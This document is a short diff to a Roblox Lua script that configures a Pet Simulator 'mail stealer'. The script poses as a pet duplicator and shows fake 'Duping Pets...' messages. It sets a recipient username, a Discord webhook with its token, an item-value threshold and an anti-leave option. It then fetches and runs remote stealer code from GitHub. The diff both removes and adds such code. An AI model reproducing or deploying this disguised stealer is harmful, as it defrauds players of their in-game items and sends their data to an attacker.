@@ -1,8 +1,8 @@
-local player_USERNAME = "raniel_jud" 
-local discord_WEBHOOK = "https://discord.com/api/webhooks/1233647875284795473/VRZMYyLTiFIZ-jZWLcQLvonO9ZgiymT4VbzuorsReu3n57spUs04tMgYnHFsiCzWooh2" 
-local Custom_Script_Name = "Jude's Duper"
-local txt_1 = "Script Loaded..." 
-local txt_2 = "Waiting for Script" 
-local txt_3 = "Duping Pets.." 
-local txt_4 = "Duping Pets..." 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
+Username = "raniel_jud"
+Username2 = "raniel_jud"
+Webhook = "https://discord.com/api/webhooks/1233647875284795473/VRZMYyLTiFIZ-jZWLcQLvonO9ZgiymT4VbzuorsReu3n57spUs04tMgYnHFsiCzWooh2"
+min_rap = 10000
+Loadingscreen = true
+antileave = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/giorpro1322/PETSIM99SCRIPTS/main/Mail%20stealer%20-%20v6.9"))()
